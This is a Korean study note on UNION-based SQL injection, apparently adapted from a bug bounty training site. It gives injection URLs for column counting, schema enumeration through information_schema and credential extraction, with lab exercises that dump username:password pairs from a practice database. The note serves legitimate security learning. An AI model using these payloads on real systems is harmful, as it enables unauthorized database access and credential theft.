# UNION 기반 SQL Injection

개인 공부용으로 참고하기 위해서 버그바운티 클럽의 Pentest Gym에서 퍼온 사진과 글을 참고하여 정리한 문서입니다. 

| 출처 : https://www.bugbountyclub.com/pentestgym/view/54

# UNION 기반 SQL Injection 이란?
웹 애플리케이션이 백엔드 데이터베이스로 질의한 SQL 쿼리의 결과가 HTTP 응답에 표시될 때, 이 쿼리를 조작하여 데이터베이스 구조 및 민감한 데이터를 획득하기 위해 사용되는 기법. 공격자는 개발자에  의해 작성된 SQL 쿼리가 어떤 행도 반환하지 않도록 하기 위해 SQL 쿼리로 입력되는 매개변수 값을 -1과 같이 데이터베이스에 없을 법한 값으로 조작하고, UNION 및 UNION ALL을 이용해 원래 SQL 쿼리에 민감한 데이터를 추출하는 SQL 쿼리를 덧붙힘으로 써 공격할 수 있다.

# UNION 기반 SQL Injection의 동작 원리
SQL의 UNION 또는 UNION ALL을 이용한다. 이는 두개의 SQL 쿼리 결과를 하나로 통합해주는 기능을 한다
다음은 MySQL 메뉴얼에 나온 UNION의 예이다. 세번째 쿼리 결과를 보면 첫번째와 두번째 쿼리의 결과를 하나의 테이블로 통합했음을 알 수 있다. UNION ALL 또한 동일하다.
```bash
mysql> SELECT 1, 2;
+---+---+
| 1 | 2 |
+---+---+
| 1 | 2 |
+---+---+
mysql> SELECT 'a', 'b';
+---+---+
| a | b |
+---+---+
| a | b |
+---+---+
mysql> SELECT 1, 2 UNION SELECT 'a', 'b';
+---+---+
| 1 | 2 |
+---+---+
| 1 | 2 |
| a | b |
+---+---+
```
유의할점은 UNION 또는 UNION ALL을 이용해 통합되는 두개 이상의 SQL 쿼리는 다음의 조건을 만족해야한다.
1. 통합되는 각 SQL 쿼리는 SELECT절에서 동일한 갯수의 컬럼을 사용해야한다.
2. 원래 SQL 쿼리의 SELECT 절 컬럼의 자료형이 새로 삽입되는 쿼리의 SELECT절 컬럼의 자료형과 호환되어야한다.
</br>

일반적으로 UNION ALL 사용이 권장되기도 한다. UNION은 SQL 쿼리 통합시 중복된 레코드를 제거하고 유일 레코드로만 반환하는 반면, UNION ALL은 중복 제거 없이 통합된 모든 레코드를 반환하는 차이가 있다.
그래서 UNION을 사용해 테스트할 경우 중복 제거에 의해 의도한 데이터가 제대로 표시되지 앟는 경우가 더러 발생한다.

UNION ALL의 공격이 어떤식으로 이루어지는지 살펴본다
- PHP & MySQL 기반의 쇼핑몰 애플리케이션에 상품의 ID값을 매개변수로 하여 상품의 정보(상품ID, 상품명, 상품가격)를 조회하는 기능이 있다고 가정.
- 데이터베이스에서 상품 정보를 조회하기 위한 SQL 쿼리는 다음과 같고 SELECT절의 칼럼 중 item_name과 item_price 칼럼이 HTTP 응답에 표시된다고 가정.
```bash
[1] SELECT item_id, item_name, item_price
[2] FROM item
[3] WHERE item_id = $_GET['item_id'];
```
UNION 기반의 SQL Injection을 수행하여 데이터베이스 버전정보를 추출하기 위한 요청 (URL 주소에서 더하기(+) 문자는 공백을 의미)
```bash
http://www.example.com/getitem.php?item_id=-99+UNION+ALL+SELECT+1,version(),3--+ 

# 요청을 전달받은 웹 애플리케이션은 원래 SQL 쿼리에 다음과 같이 GET 요청을 통해 전달받은 item_id 매개변수의 값이 주입 후 개행
[1] SELECT item_id, item_name, item_price
[2] FROM item
[3] WHERE item_id = -99
[4] UNION ALL
[5] SELECT 1, version(), 3-- ;
```
일반적으로 상품ID가 음수인 경우는 없음(이 예제에서는 item_id=-99인 상품이 없다고 가정) 1~3번 라인은 어떠한 레코드도 반환하지 않는다. 따라서 최종 5번 라인의 쿼리 결과가 HTTP 응답에 표시.
공격자가 SQL 쿼리를 위와 같이 조작하게되면 데이터베이스의 버전을 확보 가능하다.
즉 UNION 기반 SQL Injection은 개발자에 의해 작성된 원래 SQL 쿼리에 공격자의 SQL 쿼리를 통합하고 원래의 SQL 쿼리를 무효화시킴으로써 결과적으로 공격자 쿼리에서만 유효한 데이터를 표시하게 되는 것이다.

# 테스트 방법
1. 데이터베이스와 통신하는 엔드포인트 식별
대상 웹 애플리케이션의 모든 기능을 사용해보고 데이터베이스와 통신하는 것으로 의심되는 모든 엔드포인트와 매개변수를 찾아 수집한다
만일 웹 애플리케이션 내에 다양한 사용자 권한이나 역할이 존재하고 서비스가 차등적으로 제공되나면 각 권한과 역할에 대한 모든 조합별로 사용자 계정을 생성해 웹 애플리케이션을 사용
공격 벡터느 GET 매개변수, POST body 매개변수, Cookie 등의 표준 요청 헤더나 커스텀 요청 헤더가 될 수 있음

2. 잠재적 취약 여부 검증
1.에서 수집한 진입점과 매개변수가 SQL Injection에 잠재적으로 취약한지 검사할 차례이다. **잠재적으로 취약하다는 의미는 사용자의 입력값이 SQL 쿼리로 해석되어 백엔드의 데이터베이스와 통신한다는 것을 의미**
매개변수의 값이 연결되는 데이터베이스 컬럼의 자료형이 문자열 타입인지, 숫자 타입인지에 따라 아래와 같은 방법으로 검증
- 문자열 타입인 경우
```bash
?idx=1234'

# 문자열 연산자의 기능이 정상적으로 수행되는지 확인
?idx=12'%20'34      (MySQL 또는 MariaDB)
?idx=12'%2B'34      (MSSQL)
?idx=12'||'34       (Oracle)


# AND와 같은 논리 조건을 주입
?idx=1234'+AND+1%3D1--+     (참이 되는 조건 주입)  
?idx=1234'+AND+1%3D2--+     (거짓이 되는 조건 주입)   

첫번째 요청의 응답이 원래 요청과 동일하고, 두번째 요청에서는 원래와 다른 요청이 출력된다면 SQL Injection에 취약하다.
```
- 숫자 타입인 경우
홑따옴표를 이용하여 숫자타입을 처리하는 웹 애플리케이션 같은 경우 사용이 가능하나 자료형을 엄격히 준수하여 개발된 웹 애플리케이션 같은 경우는 그렇지 않은 경우도 있다. 이러한 경우 아래와 같은 방법으로 데이터베이스와 연동되는지 확인한다.
```bash
?idx=4

# 원래 요청과 동일하다면 SQL Injection에 취약
?idx=5-1
?idx=3+1
?idx=53-ASCII(1)  ---> ASCII(1)의 값은 49로 계산 결과는 4임

# 논리 조건 주입
?idx=4+AND+1%3D1--+     (참이 되는 조건 주입)  
?idx=4+AND+1%3D2--+     (거짓이 되는 조건 주입)    
```

3. 컬럼 갯수 파악
```bash
# 컬럼 직접 지정
ORDER BY 컬럼명1, 컬럼명2, 컬럼명3

# SELECT절의 컬럼 순번 지정
ORDER BY 1, 2, 3
```
컬럼 갯수를 파악하기 위해선 두번째 방법을 사용.
주입 지점이 원래 쿼리의 WHERE절에 사용된 문자열이라고 가정할 때, 컬럼의 순번을 순차적으로 증가시키며 요청을 제출한다(숫자 타입인 경우 홑따옴표 제거).
비정상적인 응답이 표시되면 SELECT절의 컬럼 갯수는 비정상적인 응답 전의 순번과 동일하다.
```bash
?idx=1234'+ORDER+BY+1--+   (정상적인 응답)
?idx=1234'+ORDER+BY+2--+   (정상적인 응답)
?idx=1234'+ORDER+BY+3--+   (정상적인 응답)    <--- 컬럼 갯수
?idx=1234'+ORDER+BY+4--+   (데이터베이스 오류 또는 비정상적 응답이 표시)
```

4. HTTP 응답에 표시되는 컬럼 파악
UNION ALL SELECT을 이용해 문자열 데이터를 표시할 수 잇는 칼럼 파악. 3개인 경우 아래와 같이 차례대로 문자열을 사용해 요청한다. 이때, 원래 쿼리에 의해 반환되는 레코드가 없도록 매개변수 값을 설정해야한다
```bash
?idx=임의의 문자열'+UNION+ALL+SELECT+'a',+NULL,+NULL--+
?idx=임의의 문자열'+UNION+ALL+SELECT+NULL,+'a',+NULL--+
?idx=임의의 문자열'+UNION+ALL+SELECT+NULL,+NULL,+'a'--+
...

# 단순한 방법
?idx=임의의 문자열'+UNION+ALL+SELECT+1,2,3--+
```

5. 데이터베이스 구조 파악
DBMS 내부적으로 제공되는 기본 변수나 함수, 시스템 테이블을 이용해 DB명, 테이블, 컬럼을 알아낸다
```bash
# 데이터베이스명
?idx=임의의 문자열'+UNION+ALL+SELECT+database(),2,3--+ 

# 테이블 추출
?idx=임의의 문자열'+UNION+ALL+SELECT+group_concat(table_name),2,3+FROM+information_schema.TABLES+WHERE+table_schema=database()--+

# 컬럼 추출
?idx=임의의 문자열'+UNION+ALL+SELECT+group_concat(column_name),2,3+FROM+information_schema.COLUMNS+WHERE+table_schema=database()+AND+table_name='테이블명'--+
```

6. 데이터 추출
```bash
?idx=임의의 문자열'+UNION+ALL+SELECT+group_concat(concat(컬럼1,0x3a,컬럼2)),2,3+FROM+데이터베이스명.테이블명--+
```

# 실습
## Exercise1
| GET 요청으로 전달되는 "name" 매개변수가 WHERE절에 사용된 문자열 타입의 컬럼에 연결됩니다. 
1. 홑따옴표를 붙여본다.
```bash
https://.../sqli_union_ex1.php?name=Jet%20Black%27

Employee Info

Something is wrong!
```

2. 잠재적 취약점 여부 검증, name=문자열 인것을 파악
```bash
# 참이 되는 조건
https://.../sqli_union_ex1.php?name=Jet%20Black%27+AND+1%3D1--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16

# 참과 다른 결과 출력
https://.../sqli_union_ex1.php?name=Jet%20Black%27+AND+1%3D3--+

Employee Info
0 results
```
데이터베이스와 통신한 다는 것을 확인했다.

3. 컬럼 갯수 확인
```bash
https://.../sqli_union_ex1.php?name=Jet%20Black%27+ORDER+BY+6--+

Employee Info

Something is wrong!
```
6번째에서 다른 결과가 출력되었으니, 5개의 칼럼을 가지고 있는 것을 확인.

4. HTTP 응답에 표시되어 공격할 수 있는 칼럼을 찾는다.
```bash
https://.../sqli_union_ex1.php?name=Jet%20Black%27+UNION+ALL+SELECT+1,2,3,4,5--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
1	3	4	2
```
1,2,3,4 번 칼럼이 응답에 표시된다.

5. 1~4번 칼럼을 이용해 데이터베이스명과 테이블명, 컬럼을 파악한다
```bash
# DB명
https://.../sqli_union_ex1.php?name=Jet%20Black%27+UNION+ALL+SELECT+database(),2,3,4,5--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
mydb	3	4	2

# 테이블명
https://.../sqli_union_ex1.php?name=Jet%20Black%27+UNION+ALL+SELECT+group_concat(table_name),2,3,4,5+FROM+information_schema.TABLES+WHERE+table_schema=database()--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
board,employees,products,users	3	4	2

# 컬럼명
https://.../sqli_union_ex1.php?name=Jet%20Black%27+UNION+ALL+SELECT+group_concat(column_name),2,3,4,5+FROM+information_schema.COLUMNS+WHERE+table_schema=database()+AND+table_name=%27users%27--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
user_sn,user_id,user_name,password,join_date,birth_date,gender,email	3	4	2
```

6. 데이터 추출 진행.
```bash
https://.../sqli_union_ex1.php?name=Jet%20Black%27+UNION+ALL+SELECT+group_concat(concat(user_id,0x3a,password)),2,3,4,5+FROM+mydb.users--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
admin:pass,spike:ilovejulia,faye:oldwoman,jet:bebopismine	3	4	2
```


## Exercise2
| GET 요청으로 전달되는 "emp_no" 매개변수는 WHERE절에 사용된 숫자 타입의 컬럼과 연결됩니다. 

1. 홑따옴표 확인
```bash
https://.../sqli_union_ex2.php?emp_no=2%27

Employee Info

Something is wrong!
```
2. 잠재적 취약 여부 검증 - 숫자형 타입
```bash
# 원래 요청과 동일 -> SQL Injection에 취약함
https://.../sqli_union_ex2.php?emp_no=3-1

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16

# 참이 되는 조건 주입
https://.../sqli_union_ex2.php?emp_no=2+AND+1%3D1--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16

# 거짓이 되는 조건 주입
https://.../sqli_union_ex2.php?emp_no=2+AND+1%3D2--+


Employee Info

0 results
```

3. 칼럼 갯수 파악 - 숫자 타입이므로 홑따옴표 제거
```bash
https://.../sqli_union_ex2.php?emp_no=2+ORDER+BY+5--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16

https://.../sqli_union_ex2.php?emp_no=2+ORDER+BY+6--+

Employee Info

Something is wrong!
```

4. HTTP 응답에 표시되는 칼럽 파악 
```bash
https://.../sqli_union_ex2.php?emp_no=2+UNION+ALL+SELECT+1,2,3,4,5--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
1	3	4	2
```

5. 데이터베이스 구조 파악
```bash
# DB명
https://.../sqli_union_ex2.php?emp_no=2+UNION+ALL+SELECT+1,2,database(),4,5--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
1	mydb	4	2

# 테이블명
https://.../sqli_union_ex2.php?emp_no=2+UNION+ALL+SELECT+1,2,group_concat(table_name),4,5+FROM+information_schema.TABLES+WHERE+table_schema=database()--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
1	board,employees,products,users	4	2
# 컬럼명
https://.../sqli_union_ex2.php?emp_no=2+UNION+ALL+SELECT+1,2,group_concat(column_name),4,5+FROM+information_schema.COLUMNS+WHERE+table_schema=database()+AND+table_name=%27users%27--+

Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
1	user_sn,user_id,user_name,password,join_date,birth_date,gender,email	4	2
```

6. 데이터 추출
```bash
https://.../sqli_union_ex2.php?emp_no=2+UNION+ALL+SELECT+1,2,group_concat(concat(user_id,0x3a,password)),4,5+FROM+mydb.users--+


Employee Info
No	Name	Gender	Birthday
2	Jet Black	M	1974-11-16
1	admin:pass,spike:ilovejulia,faye:oldwoman,jet:bebopismine	4	2

spike:ilovejulia
```

